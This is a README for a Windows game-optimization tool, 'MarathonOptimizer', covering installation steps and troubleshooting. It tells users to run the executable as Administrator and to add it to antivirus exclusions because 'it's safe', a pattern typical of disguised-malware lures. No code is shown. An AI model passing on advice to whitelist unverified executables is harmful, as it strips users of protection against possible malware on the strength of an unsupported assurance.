## 🛠️ Installation (Windows 10/11)

### Quick Start
1. Extract the archive to any folder (e.g., `C:\MarathonOptimizer`).
2. **Run `MarathonOptimizer.exe` as Administrator**.
3. Click "Apply All Tweaks" – the tool will:
   - Enable Game Mode and Hardware-accelerated GPU Scheduling (HAGS)
   - Set High Performance power plan
   - Disable unnecessary startup apps and background services
   - Optimize NVIDIA Control Panel settings (low latency, max performance)
   - Apply best in-game graphics settings (DLSS, shadows, FOV) 
   - Configure network settings (UPnP, delivery optimization)
4. Restart your PC for best results.

## ❗ Troubleshooting

| Problem | Solution |
|---------|----------|
| Tool won't start | Run as Administrator. Install .NET Framework 4.8+ |
| UI fix not applying | Restart game after applying. Some settings require a reboot |
| FPS boost not working | Try different preset (Low, Medium, High). Reset to default if needed |
| RUTABAGA error persists | Ensure game is on SSD/NVMe; delete CVARS.xml |
| Input lag after patch | Disable Steam Overlay; enable NVIDIA Reflex in-game |
| Antivirus false positive | Add `MarathonOptimizer.exe` to exclusions – it's safe |
